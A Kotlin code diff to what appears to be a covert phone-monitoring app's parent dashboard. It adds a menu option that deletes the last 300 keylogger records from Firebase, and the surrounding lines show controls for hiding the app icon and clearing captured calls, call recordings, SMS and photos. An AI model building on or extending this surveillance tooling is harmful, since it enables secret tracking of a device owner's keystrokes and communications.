@@ -64,6 +64,8 @@ import com.example.rule.dash.utils.FileHelper.getUriPath
 import com.example.rule.dash.utils.HomeWatcher
 import com.google.android.material.navigation.NavigationView
 import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.ValueEventListener
 import com.pawegio.kandroid.e
 import com.pawegio.kandroid.longToast
 import kotterknife.bindView
@@ -177,6 +179,7 @@ class MainParentActivity : BaseActivity(R.layout.activity_main_parent), Interfac
                 R.id.nav_show_app -> interactorParent.getDatabaseReference("$DATA/$CHILD_SHOW_APP").setValue(true)
                 R.id.nav_hide_app -> interactorParent.getDatabaseReference("$DATA/$CHILD_SHOW_APP").setValue(false)
                 R.id.nav_clear_keylogger -> showDialogClearLogList(R.string.message_dialog_clear_keylogger,"$KEY_LOGGER/$DATA")
+                R.id.nav_clear_300_keylogger -> deleteLast300Log()
                 R.id.nav_clear_calls -> showDialogClearLogList(R.string.message_dialog_clear_calls,"$CALLS/$DATA"){ deleteAllFile(ADDRESS_AUDIO_CALLS) }
                 R.id.nav_clear_sms -> showDialogClearLogList(R.string.message_dialog_clear_sms,"$SMS/$DATA")
                 R.id.nav_clear_photo -> showDialogClearLogList(R.string.message_dialog_clear_photos,"$PHOTO/$DATA")
@@ -248,7 +251,24 @@ class MainParentActivity : BaseActivity(R.layout.activity_main_parent), Interfac
             show()
         }
     }
-
+    private fun deleteLast300Log(){
+        showDialog(SweetAlertDialog.WARNING_TYPE,R.string.title_dialog,getString(R.string.message_dialog_clear_300_keylogger),R.string.clear,true){
+            setConfirmClickListener {
+                interactorParent.getDatabaseReference("$KEY_LOGGER/$DATA").limitToLast(300).addListenerForSingleValueEvent(object : ValueEventListener {
+                    override fun onDataChange(dataSnapshot: DataSnapshot) {
+                        for (snapshot in dataSnapshot.children) {
+                            snapshot.ref.removeValue()
+                        }
+                    }
+                    override fun onCancelled(databaseError: DatabaseError) {
+                        databaseError.toException().printStackTrace()
+                    }
+                })
+                hideDialog()
+            }
+            show()
+        }
+    }
     override fun signOutView() {
         clearAll()
         startAnimateActivity<LoginActivity>(R.anim.fade_in,R.anim.fade_out)
